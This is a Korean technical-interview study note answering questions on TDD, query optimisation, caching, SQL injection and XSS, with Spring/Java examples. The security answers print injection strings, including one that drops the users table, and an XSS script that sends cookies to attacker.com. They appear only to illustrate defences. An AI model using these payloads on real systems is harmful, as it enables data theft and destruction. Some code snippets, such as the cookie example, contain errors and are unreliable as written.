---
tags: teck-interview
---
### **Q96. 테스트 - TDD**

**면접관**: TDD(Test-Driven Development)에 대해 설명해주세요.

**답변**:

```
TDD는 테스트를 먼저 작성하고
그 다음에 코드를 작성하는 개발 방법론입니다.

Red-Green-Refactor 사이클:

1. Red: 실패하는 테스트 작성
2. Green: 테스트를 통과하는 최소한의 코드 작성
3. Refactor: 코드 개선

실제 예시:

사용자 등록 기능을 TDD로 개발한다면,

Step 1 - Red (실패하는 테스트):

@Test
void 사용자_등록_성공() {
    // given
    RegisterDTO dto = new RegisterDTO("hong@example.com", "1234");
    
    // when
    User user = userService.register(dto);
    
    // then
    assertThat(user.getEmail()).isEqualTo("hong@example.com");
    assertThat(user.getPassword()).isNotEqualTo("1234");  // 암호화됨
}

이 시점에는 UserService.register() 메서드가
아예 없으니까 컴파일 에러입니다.

Step 2 - Green (통과하는 코드):

@Service
public class UserService {
    
    private final UserRepository repository;
    private final PasswordEncoder encoder;
    
    public User register(RegisterDTO dto) {
        User user = User.builder()
            .email(dto.getEmail())
            .password(encoder.encode(dto.getPassword()))
            .build();
        
        return repository.save(user);
    }
}

테스트 통과!

Step 3 - Refactor (개선):

중복 이메일 체크 추가:

@Test
void 중복_이메일_예외() {
    // given
    RegisterDTO dto = new RegisterDTO("hong@example.com", "1234");
    userService.register(dto);
    
    // when & then
    assertThrows(DuplicateEmailException.class,
        () -> userService.register(dto));
}

코드 수정:

public User register(RegisterDTO dto) {
    // 중복 체크 추가
    if (repository.existsByEmail(dto.getEmail())) {
        throw new DuplicateEmailException();
    }
    
    User user = User.builder()
        .email(dto.getEmail())
        .password(encoder.encode(dto.getPassword()))
        .build();
    
    return repository.save(user);
}

이런 식으로 계속 반복합니다.

BizSync에서 적용했다면:

Task 생성 기능

// 1. Red - 테스트 먼저
@Test
void Task_생성_성공() {
    CreateTaskDTO dto = new CreateTaskDTO("새 작업", 1L);
    Task task = taskService.create(dto);
    assertThat(task.getTitle()).isEqualTo("새 작업");
}

// 2. Green - 구현
public Task create(CreateTaskDTO dto) {
    Task task = Task.builder()
        .title(dto.getTitle())
        .columnId(dto.getColumnId())
        .build();
    return taskRepository.save(task);
}

// 3. 다음 테스트 추가
@Test
void Task_제목_필수() {
    CreateTaskDTO dto = new CreateTaskDTO("", 1L);
    assertThrows(ValidationException.class,
        () -> taskService.create(dto));
}

// 4. 검증 로직 추가
public Task create(CreateTaskDTO dto) {
    if (dto.getTitle() == null || dto.getTitle().isBlank()) {
        throw new ValidationException("제목은 필수입니다");
    }
    // ...
}

TDD의 장점:

1. 버그 조기 발견
테스트를 먼저 쓰니까 요구사항을
명확히 이해하고 시작합니다.

2. 리팩토링 자신감
테스트가 있으니까 코드 변경 후
즉시 검증 가능합니다.

3. 문서화 효과
테스트 코드가 사용법을 보여줍니다.

4. 설계 개선
테스트하기 쉬운 코드는
보통 설계도 좋습니다.

단점:

1. 시간이 더 걸림
처음엔 테스트 작성에 시간 투자해야 합니다.

2. 학습 곡선
익숙해지려면 연습이 필요합니다.

3. 모든 경우에 적합하진 않음
UI나 프로토타입은 TDD가 비효율적일 수 있습니다.

실무에서:

완전한 TDD는 어렵지만,
최소한 핵심 비즈니스 로직은
테스트를 먼저 작성하려고 노력합니다.

특히 복잡한 계산이나 조건 분기가 많은
로직은 TDD가 큰 도움이 됩니다.

정리:
- Red-Green-Refactor 사이클
- 테스트 먼저, 구현은 나중
- 설계 품질 향상
- 리팩토링 자신감
```

---

### **Q97. 성능 최적화 - 쿼리 최적화**

**면접관**: 느린 쿼리를 어떻게 최적화하나요?

**답변**:

```
쿼리 최적화는 크게 세 가지 방법이 있습니다.

첫 번째, 인덱스 추가입니다.

문제 상황:

SELECT * FROM task
WHERE deadline < NOW()
AND status = 'PENDING';
-- 1000ms 걸림 (10만 건)

EXPLAIN으로 확인:

EXPLAIN SELECT * FROM task
WHERE deadline < NOW();

결과:
type: ALL  -- Full Table Scan!
rows: 100000

인덱스 추가:

CREATE INDEX idx_task_deadline_status
ON task (deadline, status);

다시 실행:
type: range
rows: 100
-- 5ms로 단축!

두 번째, 쿼리 개선입니다.

N+1 문제:

// 나쁨
List<Task> tasks = taskRepository.findAll();  // 1번
for (Task task : tasks) {
    User worker = task.getWorker();  // N번
    System.out.println(worker.getName());
}
-- 총 101번 쿼리 (1 + 100)

// 좋음
List<Task> tasks = taskRepository.findAllWithWorker();  // 1번
-- JOIN으로 한 번에

@Query("SELECT t FROM Task t JOIN FETCH t.worker")
List<Task> findAllWithWorker();

불필요한 컬럼 조회:

// 나쁨
SELECT * FROM task;
-- 10개 컬럼 전부 조회

// 좋음
SELECT task_id, title, deadline FROM task;
-- 필요한 3개만

DTO 프로젝션:

@Query("SELECT new TaskSummaryDTO(t.taskId, t.title) " +
       "FROM Task t")
List<TaskSummaryDTO> findAllSummary();

세 번째, 페이징입니다.

// 나쁨
List<Task> tasks = taskRepository.findAll();
-- 10만 건 한 번에

// 좋음
Page<Task> tasks = taskRepository.findAll(
    PageRequest.of(0, 20)
);
-- 20개씩만

BizSync 실제 최적화 경험:

문제:
칸반 보드 조회가 2초 걸림

분석:
프로젝트 → 컬럼 → Task → 담당자
3단계 JOIN에 N+1 문제까지

해결:
MyBatis로 한 방 쿼리:

<select id="selectProjectBoard">
    SELECT 
        p.project_id,
        p.name,
        c.column_id,
        c.title,
        t.task_id,
        t.title,
        u.user_id,
        u.name
    FROM project p
    LEFT JOIN kanban_column c ON p.project_id = c.project_id
    LEFT JOIN task t ON c.column_id = t.column_id
    LEFT JOIN users u ON t.worker_id = u.user_id
    WHERE p.project_id = #{projectId}
    ORDER BY c.sequence, t.sequence
</select>

결과: 2초 → 50ms

쿼리 성능 측정:

application.yml:
logging:
  level:
    org.hibernate.SQL: DEBUG
    org.hibernate.type.descriptor.sql.BasicBinder: TRACE

spring:
  jpa:
    properties:
      hibernate:
        format_sql: true

로그에서 느린 쿼리 찾기:
Hibernate: select ... (took 2500ms)

실행 계획 확인:

EXPLAIN ANALYZE
SELECT ...

주의사항:

1. 과도한 인덱스
인덱스가 많으면 INSERT/UPDATE 느려집니다.
자주 조회되는 컬럼만 인덱스 생성.

2. SELECT *
필요한 컬럼만 조회.

3. 서브쿼리
가능하면 JOIN으로 변경.

정리:
- 인덱스로 조회 속도 향상
- N+1 문제 해결 (fetch join)
- DTO 프로젝션으로 컬럼 최소화
- 페이징 필수
- EXPLAIN으로 분석
```

---

### **Q98. 성능 최적화 - 캐싱**

**면접관**: 캐싱 전략을 설명해주세요.

**답변**:

```
캐싱은 자주 사용하는 데이터를
메모리에 저장해서 빠르게 접근하는 겁니다.

캐싱 레벨:

1. 애플리케이션 캐시 (메모리)
2. 분산 캐시 (Redis)
3. CDN (정적 파일)
4. 브라우저 캐시

Spring Cache:

@Cacheable("projects")
public Project findById(Long id) {
    // 첫 호출: DB 조회 후 캐싱
    // 이후: 캐시에서 반환
    return projectRepository.findById(id).orElseThrow();
}

캐시 전략:

1. Cache-Aside (Lazy Loading)

public Project findById(Long id) {
    // 1. 캐시 확인
    Project cached = cache.get("project:" + id);
    if (cached != null) {
        return cached;
    }
    
    // 2. DB 조회
    Project project = repository.findById(id);
    
    // 3. 캐시 저장
    cache.put("project:" + id, project);
    
    return project;
}

장점: 필요한 것만 캐싱
단점: 첫 호출 느림

2. Write-Through

public Project update(Project project) {
    // 1. DB 저장
    Project saved = repository.save(project);
    
    // 2. 캐시 업데이트
    cache.put("project:" + project.getId(), saved);
    
    return saved;
}

장점: 캐시 항상 최신
단점: 쓰기 느림

3. Write-Behind (Write-Back)

public Project update(Project project) {
    // 1. 캐시만 업데이트
    cache.put("project:" + project.getId(), project);
    
    // 2. 비동기로 DB 저장
    asyncWriter.save(project);
    
    return project;
}

장점: 쓰기 빠름
단점: 장애 시 데이터 손실 가능

BizSync 적용:

사용자 정보는 자주 조회되니까 캐싱:

@Cacheable(value = "users", key = "#id")
public User findById(Long id) {
    return userRepository.findById(id).orElseThrow();
}

수정 시 캐시 갱신:

@CachePut(value = "users", key = "#user.userId")
public User update(User user) {
    return userRepository.save(user);
}

삭제 시 캐시 제거:

@CacheEvict(value = "users", key = "#id")
public void delete(Long id) {
    userRepository.deleteById(id);
}

Redis 설정:

@Configuration
@EnableCaching
public class CacheConfig {
    
    @Bean
    public CacheManager cacheManager(
        RedisConnectionFactory factory
    ) {
        RedisCacheConfiguration config = 
            RedisCacheConfiguration.defaultCacheConfig()
                .entryTtl(Duration.ofMinutes(10))  // 10분 후 만료
                .serializeValuesWith(
                    RedisSerializationContext
                        .SerializationPair
                        .fromSerializer(new GenericJackson2JsonRedisSerializer())
                );
        
        return RedisCacheManager.builder(factory)
            .cacheDefaults(config)
            .build();
    }
}

캐시 키 설계:

// 나쁨
@Cacheable("data")
public Data getData() { }
-- 모든 호출이 같은 캐시 사용!

// 좋음
@Cacheable(value = "projects", key = "#id")
public Project findById(Long id) { }
-- ID별로 다른 캐시

복합 키:

@Cacheable(value = "tasks", key = "#projectId + ':' + #userId")
public List<Task> findByProjectAndUser(Long projectId, Long userId) { }

캐시 무효화:

전략 1: TTL (Time To Live)
entryTtl(Duration.ofMinutes(10))
-- 10분 후 자동 삭제

전략 2: 수동 무효화
@CacheEvict로 명시적 삭제

전략 3: 이벤트 기반
데이터 변경 시 이벤트 발행 → 캐시 삭제

주의사항:

1. 캐시 스탬피드
캐시 만료 시 동시 요청이
모두 DB로 가는 문제

해결: Lock 또는 Refresh Ahead

2. 메모리 관리
캐시가 너무 커지면 OOM

해결: LRU 정책, 최대 크기 설정

3. 데이터 정합성
캐시와 DB가 불일치할 수 있음

해결: TTL 짧게 또는 이벤트 기반 무효화

정리:
- 자주 조회되는 데이터 캐싱
- TTL로 만료 시간 설정
- 수정/삭제 시 캐시 갱신/삭제
- Redis로 분산 캐싱
```

---

### **Q99. 보안 - SQL Injection**

**면접관**: SQL Injection을 방어하는 방법은?

**답변**:

```
SQL Injection은 악의적인 SQL을
삽입해서 DB를 공격하는 기법입니다.

취약한 코드:

String sql = "SELECT * FROM users WHERE email = '" + email + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(sql);

공격:
email = "admin' OR '1'='1"

실행되는 쿼리:
SELECT * FROM users WHERE email = 'admin' OR '1'='1'
-- 모든 사용자 조회됨!

더 위험한 공격:
email = "admin'; DROP TABLE users; --"

실행되는 쿼리:
SELECT * FROM users WHERE email = 'admin'; 
DROP TABLE users; 
--'

방어 방법:

1. Prepared Statement (가장 중요)

String sql = "SELECT * FROM users WHERE email = ?";
PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setString(1, email);  // 자동으로 이스케이프
ResultSet rs = pstmt.executeQuery();

email = "admin' OR '1'='1" 입력해도
WHERE email = 'admin'' OR ''1''=''1''
-- 문자열로 처리되어 안전

JPA는 기본적으로 안전:

// 안전
@Query("SELECT u FROM User u WHERE u.email = :email")
User findByEmail(@Param("email") String email);

// 안전
userRepository.findByEmail(email);

위험한 경우:

// 위험!
@Query(value = "SELECT * FROM users WHERE email = '" + email + "'", 
       nativeQuery = true)
User findByEmail(String email);

2. 입력값 검증

public void validateEmail(String email) {
    if (!email.matches("^[A-Za-z0-9+_.-]+@(.+)$")) {
        throw new ValidationException("올바른 이메일 형식이 아닙니다");
    }
}

3. ORM 사용

JPA, MyBatis는 자동으로
파라미터를 이스케이프합니다.

MyBatis:

<!-- 안전 -->
<select id="findByEmail">
    SELECT * FROM users WHERE email = #{email}
</select>

<!-- 위험! -->
<select id="findByEmail">
    SELECT * FROM users WHERE email = '${email}'
</select>

#{} : PreparedStatement 사용
${} : 문자열 치환 (위험)

4. 최소 권한 원칙

DB 계정에 최소한의 권한만:

-- 애플리케이션 계정
GRANT SELECT, INSERT, UPDATE, DELETE 
ON bizsync.* TO 'app_user'@'localhost';

-- DROP, ALTER 같은 건 주지 않음

5. 에러 메시지 노출 금지

// 나쁨
catch (SQLException e) {
    return "Error: " + e.getMessage();
    // SQL 구조 노출!
}

// 좋음
catch (SQLException e) {
    log.error("DB 에러", e);
    return "시스템 오류가 발생했습니다";
}

BizSync 적용:

모든 쿼리를 JPA/MyBatis로 작성:

// Repository (안전)
public interface UserRepository extends JpaRepository<User, Long> {
    Optional<User> findByEmail(String email);
}

// MyBatis (안전)
<select id="findByEmail">
    SELECT * FROM users 
    WHERE email = #{email}
</select>

Native Query 사용 시:

@Query(value = "SELECT * FROM users WHERE email = ?1", 
       nativeQuery = true)
User findByEmailNative(String email);
-- ?1로 파라미터 바인딩

동적 쿼리도 안전하게:

// MyBatis
<select id="search">
    SELECT * FROM task
    WHERE 1=1
    <if test="title != null">
        AND title LIKE CONCAT('%', #{title}, '%')
    </if>
    <if test="status != null">
        AND status = #{status}
    </if>
</select>

정리:
- PreparedStatement 필수
- JPA/MyBatis 사용
- 입력값 검증
- ${} 대신 #{} 사용 (MyBatis)
- 에러 메시지 노출 금지
```

---

### **Q100. 보안 - XSS**

**면접관**: XSS(Cross-Site Scripting) 공격을 방어하는 방법은?

**답변**:

```
XSS는 악성 스크립트를 삽입해서
다른 사용자의 브라우저에서 실행시키는 공격입니다.

공격 예시:

게시판에 댓글 작성:
<script>
  fetch('http://attacker.com?cookie=' + document.cookie);
</script>

다른 사용자가 게시글 보면
쿠키가 공격자 서버로 전송됩니다!

방어 방법:

1. 출력 시 이스케이프

// 나쁨
<div>${comment}</div>
-- 스크립트가 그대로 실행됨

// 좋음
<div th:text="${comment}"></div>
-- Thymeleaf가 자동으로 이스케이프

결과:
&lt;script&gt;alert('XSS')&lt;/script&gt;
-- 실행 안 되고 문자열로 표시됨

React는 기본적으로 안전:

const Comment = ({ text }) => {
  return <div>{text}</div>;
  // 자동으로 이스케이프
};

위험한 경우:

// 위험!
<div dangerouslySetInnerHTML={{ __html: comment }} />
-- HTML 그대로 렌더링

2. 입력값 검증 및 필터링

public String sanitize(String input) {
    return input
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace("\"", "&quot;")
        .replace("'", "&#x27;")
        .replace("/", "&#x2F;");
}

라이브러리 사용:

<dependency>
    <groupId>org.owasp.encoder</groupId>
    <artifactId>encoder</artifactId>
</dependency>

import org.owasp.encoder.Encode;

String safe = Encode.forHtml(userInput);

3. Content Security Policy (CSP)

Response Header에 추가:

Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' https://trusted-cdn.com;
  style-src 'self' 'unsafe-inline';

외부 스크립트 차단!

Spring Security:

@Bean
public SecurityFilterChain filterChain(HttpSecurity http) {
    http.headers(headers -> headers
        .contentSecurityPolicy(csp -> csp
            .policyDirectives("script-src 'self'")
        )
    );
    return http.build();
}

4. HttpOnly 쿠키

JWT를 쿠키에 저장한다면:

response.addCookie(
    Cookie cookie = new Cookie("token", jwt);
    cookie.setHttpOnly(true);  // JavaScript 접근 불가
    cookie.setSecure(true);    // HTTPS만
);

JavaScript로 document.cookie 해도
읽을 수 없습니다.

5. 입력값 화이트리스트

허용된 태그만:

public String sanitizeHtml(String html) {
    Whitelist whitelist = Whitelist.basic()
        .addTags("b", "i", "u", "p", "br");
    
    return Jsoup.clean(html, whitelist);
}

<script>는 제거되고
<b>, <i> 같은 것만 허용.

BizSync 적용:

React는 기본적으로 안전하지만
사용자 입력을 받는 곳에서 주의:

// 댓글 표시
const Comment = ({ comment }) => {
  return (
    <div>
      {comment.content}  {/* 자동 이스케이프 */}
    </div>
  );
};

// 서버에서도 검증
@PostMapping("/api/comments")
public Comment create(@Valid @RequestBody CommentDTO dto) {
    String sanitized = sanitizeHtml(dto.getContent());
    return commentService.create(sanitized);
}

JWT는 localStorage보다 HttpOnly 쿠키:

// 나쁨
localStorage.setItem('token', jwt);
// XSS로 탈취 가능

// 좋음
// 서버에서 HttpOnly 쿠키로 설정
// JavaScript 접근 불가

정리:
- 출력 시 이스케이프 (필수)
- React는 기본 안전
- dangerouslySetInnerHTML 금지
- CSP 헤더 설정
- HttpOnly 쿠키
- 입력값 화이트리스트
```

---
[[기술면접예상문제1]]
[[기술면접예상문제2]]
[[기술면접예상문제3]]
[[기술면접예상문제4]]
[[기술면접예상문제5]]
[[기술면접예상문제6]]
[[기술면접예상문제7]]
[[기술면접예상문제8]]
[[기술면접예상문제9]]
[[기술면접예상문제10]]
[[기술면접예상문제11]]
[[기술면접예상문제12]]
[[기술면접예상문제13]]
[[기술면접예상문제14]]
[[기술면접예상문제15]]